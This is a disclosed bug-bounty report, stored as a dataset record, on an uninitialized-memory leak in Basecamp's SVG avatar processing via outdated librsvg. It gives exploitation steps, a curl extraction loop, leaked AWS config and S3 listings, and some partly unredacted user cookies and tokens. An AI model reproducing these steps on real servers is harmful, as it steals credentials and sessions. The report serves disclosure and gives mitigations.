{
  "reported_to": "Basecamp",
  "reported_by": "neex ",
  "title": "AWS keys and user cookie leakage via uninitialized memory leak in outdated librsvg version in Basecamp",
  "content": "\nBasecamp supports uploading SVG pictures as avatars. Apparently, they are converted via an outdated librsvg version at Basecamp's servers. This version contains a vulnerability that allows leakage of the contents of an uninitialized memory block (that is, something is malloced, never initialized, and then used to build the preview image). Since it seems to be performed in the same unix process as the general request processing, it is possible for an attacker to steal sensitive data from this process, including basecamp configs (e.g., AWS keys) and requests of random users.\nSteps to reproduce\nFirst, you must generate an image that triggers the vulnerability. To do so, you will need Python installed. Download the attached program rsvgeb.py (F2597505) and run it like this: python3 rsvgeb.py gen 260x260 --format bmp zalupa.png (exactly like this). The result will be stored in the zalupa.png file (which is actually an SVG). The picture contains the exploit itself and carefully chosen SVG filters that make it possible to recover the original data regardless of later conversion artifacts.\nSecond, upload the resulting image as your avatar. Login to your Basecamp account, go to your profile (click on the circle image at the top left corner, then go to \"Profile, password, \u2588\u2588\u2588\"), there use the \"Change your avatar button\" and select the zalupa.png we generated earlier. Don't forget to click on the green button \"Save my changes\" at the bottom of the page.\nAfter the avatar update, you will see the pixel image instead of the avatar. We'll use rsvgeb.py again to extract the information. However, the script uses ImageMagick to extract pixel data from PNG files, so you will need it installed locally (at the environment where the rsvgeb.py is ran). apt install imagemagick -y should be enough on Debian and Ubuntu systems.\nAfter installing ImageMagick, you must retrieve the public link to your avatar. To do this, click on your avatar with the right mouse button, and choose \"Copy image address\". After that, open the copied link in a new tab to follow the redirect. The link should change from something like \u2588\u2588\u2588\u2588 to something like \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588. Copy the latter one.\nwhile true; do curl \"\u2588\u2588\u2588\u2588$RANDOM$RANDOM$RANDOM$RANDOM.png?v=1\" | python3 rsvgeb.py recover 260x260 - | strings -n 10 | tee -a pizda_hui_govno.txt; done\nExecute the command. You will see fragments of memory from some Basecamp servers that will also accumulate in pizda_hui_govno.txt. Sometimes you will see trash or parts of the original SVG, but sometimes you will see fascinating pieces of information. Keep the script running for some time so you will get more sensitive memory fragments (I ran it for 48+ hours). Inspect pizda_hui_govno.txt to check what you have.\nImpact\nGiven the nature of the vulnerability, the attacker does not control which kind of information she will extract. However, due to the lack of isolation between the image converter process and the main Ruby on Rails application, the extracted info might be quite sensitive.\nSeemingly, the most exciting fragment I came across included AWS keys and looked like this:\nCode 352 Bytes\n1    \u2588\u2588\u2588\n2    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3    \u2588\u2588\u2588\u2588\u2588\u2588\n4    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n5    -----END RSA PRIVATE KEY-----\n6\n7s3_backup:\n8  access_key_id: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n9  secret_access_key: \u2588\u2588\u2588\u2588\u2588\n10\n11sns:\n12  access_key_id: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n13  secret_access_key: \u2588\u2588\u2588\u2588\u2588\n14\n15active_record_encryption:\n16  primary_key: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n17  deterministic_key: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n18  key_derivation_salt: \u2588\u2588\u2588\u2588\u2588\n19\n20new_relic:\n21  license_key: \u2588\u2588\u2588\u2588\u2588\u2588\nThat is, apparently, a fragment of some internal Basecamp config. Other similar configs include:\nCode 335 Bytes\n1production_s3_primary:\n2  service: S3\n3  access_key_id: \u2588\u2588\u2588\n4  secret_access_key: \u2588\u2588\u2588\u2588\u2588\n5  region: us-east-2\n6  bucket: \u2588\u2588\u2588\n7  upload:\n8    storage_class: INTELLIGENT_TIERING\n9\n10production_s3_replica:\n11  service: S3\n12  access_key_id: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n13  secret_access_key: \u2588\u2588\u2588\n14  region: us-west-2\n15  bucket: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n16  upload:\n17    storage_class: ONEZONE_IA\nI've checked that the keys actually work, but have not performed any post exploitation:\nCode 975 Bytes\n1$ AWS_DEFAULT_REGION=us-east-2 AWS_ACCESS_KEY_ID=\u2588\u2588\u2588\u2588 AWS_SECRET_ACCESS_KEY=\u2588\u2588\u2588\u2588\u2588\u2588 aws sts get-caller-identity\n2{\n3    \"UserId\": \"\u2588\u2588\u2588\u2588\u2588\u2588\",\n4    \"Account\": \"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\n5    \"Arn\": \"arn:aws:iam::\u2588\u2588\u2588\u2588\u2588\u2588:user/bc3-storage\"\n6}\n7$ AWS_DEFAULT_REGION=us-east-2 AWS_ACCESS_KEY_ID=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 AWS_SECRET_ACCESS_KEY=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 aws s3 ls s3://\u2588\u2588\u2588/\n8                           PRE \u2588\u2588\u2588\u2588\u2588\u2588\u2588/\n9                           PRE \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\n10                           PRE \u2588\u2588\u2588/\n11                           PRE \u2588\u2588\u2588\u2588\u2588\u2588/\n12                           PRE \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\n13                           PRE \u2588\u2588\u2588\u2588/\n14                           PRE \u2588\u2588\u2588\u2588\u2588\u2588\u2588/\n15                           PRE \u2588\u2588\u2588/\n16                           PRE \u2588\u2588\u2588/\n17                           PRE \u2588\u2588\u2588\u2588\u2588/\n18                           PRE \u2588\u2588\u2588\u2588\u2588/\n19                           PRE \u2588\u2588\u2588\u2588\u2588/\n20\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n21\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\n22\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\n23\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\n24\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n25\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n26\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n27... snip ...\nAnother thing that I was able to extract is fragments of queries of other users, including cookies (that is a random example):\nCode 1.17 KiB\n1X_REAL_IP: \u2588\u2588\u2588\u2588\u2588\n2X_FORWARDED_FOR: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588, \u2588\u2588\u2588\n3HOST: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n4X_QUEUE_START: 1690786808.173\n5CONNECTION: close\n6COOKIE: \u2588\u2588\u2588\u2588\u2588\n7\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588%\u2588\u2588\u2588\u2588\u2588\u2588%2BVxMClK5d1rjoLKbCyFnKab9lI2lZ9sLvGW%2BT60xsygpl6syYIfVHK73km9DT98ecq0JD68OBnI9EdzLcEdmI5%2BXr%2FuOZ5BeUMoX--kvDVySR7oaYSGdHy--RU8uCFyrq8mPCjEvyX38OA%3D%3D; _csrf_token=KHczIU3KBHe%2FJjVhpFWn48FJ2vtYha4YdwUvXdypO51h5iLa4XvkjqaX0XYtzy7fOJahGGN40mfq8GMEN0v1t0SqEnfJUY%2F7CY1mVVSs9EuAFK8wF4Wrh5jA9jk4sen8KDEDXq7sjAMjdnsLLzIjL0LYLG8P8%2FsZz2BHy95JB9JTSsyPleUI--MLV2RZiAHIJrVXv%2F--rQLRhEgWWYGfXxRmqL%2B%2Frw%3D%3D; authenticity_token=\u2588\u2588\u2588\u2588; color_scheme=none; bc3_session_verification_token=0187762ee195d9bdbb1c; bc3_identity_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCSTBqYXdFPSIsImV4cCI6bnVsbCwicHVyIjoiY29va2llLmJjM19pZGVudGl0eV9pZCJ9fQ%3D%3D--957bc8a13ea3ae13b00792f0fecaa58f046a791b\n8ACCEPT: application/json\n9X_REQUESTED_WITH: XMLHttpRequest\n10ACCEPT_LANGUAGE: de-DE,de;q=0.9\n11IF_NONE_MATCH: W/\"77ae6ae7dd96d1bac74baed254a6ab62\"\n12USER_AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15\n13REFERER: \u2588\u2588\u2588\u2588\u2588\n14X_FETCH_TYPE: native\n15X_CSRF_TOKEN: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n16X_FORWARDED_PROTO: https\n17X_FORWARDED_PORT: 443\nAlso, there were some fragments of Ruby code:\nCode 750 Bytes\n1def owner_id_before_type_cast();self.attribute_before_type_cast(\"owner_id\");end;def organization_before_type_cast();self.attribute_before_type_cast(\"organization\");end;def about_url_before_type_cast();self.attribute_before_type_cast(\"about_url\");end;def client_id_before_type_cast();self.attribute_before_type_cast(\"client_id\");end;def client_secret_before_type_cast();self.attribute_before_type_cast(\"client_secret\");end;def redirect_uri_before_type_cast();self.attribute_before_type_cast(\"redirect_uri\");end;def trusted_before_type_cast();self.attribute_before_type_cast(\"trusted\");end;def scope_before_type_cast();self.attribute_before_type_cast(\"scope\");end;def signing_secret_before_type_cast();self.attribute_before_type_cast(\"signing_secret\");\nMitigation\nAs the first and the easiest hotfix, I suggest updating the librsvg to the latest version. That will fix this particular bug.\nAnother possible quick-fix option would be to forbid uploading SVG avatars or to skip preview generation for them. Note that the previews are not generated for the SVG files anywhere except the avatars (e.g., in the \"Docs & Files\" section); thus, exploiting librsvg issues is impossible using these endpoints.\nAs a long-term solution, I suggest moving image preview generation to an isolated environment. If you would convert every image in another process inside a networkless docker, that would eliminate all the class of image converter-related issues.\n\n",
  "severity": [
    8.6,
    null
  ],
  "bounty": 8868,
  "weaknesses": [
    "Information Disclosure"
  ],
  "screenshots": {},
  "disclosed_date": 1695323820,
  "report_url": "https://hackerone.com/reports/2107680",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Generate an exploit SVG image using the provided Python script"
    ],
    [
      2,
      "Upload the generated SVG as an avatar in Basecamp"
    ],
    [
      3,
      "Retrieve the public link to the uploaded avatar"
    ],
    [
      4,
      "Use the provided script to extract memory fragments from the server"
    ]
  ],
  "vuln_description": "The vulnerability involves exploiting an uninitialized memory leak in an outdated version of librsvg used by Basecamp for SVG image processing. This allows an attacker to extract sensitive data from the server's memory, including AWS keys and user cookies, by uploading a specially crafted SVG image as an avatar.",
  "reason": "The attack requires multiple steps, including generating a specific exploit image, understanding the memory leak behavior, and extracting data from the server's response. The interaction between the SVG processing and memory handling is non-obvious, and the exploit leverages a subtle flaw in the librsvg library.",
  "new_complexity": "HIGH",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null
}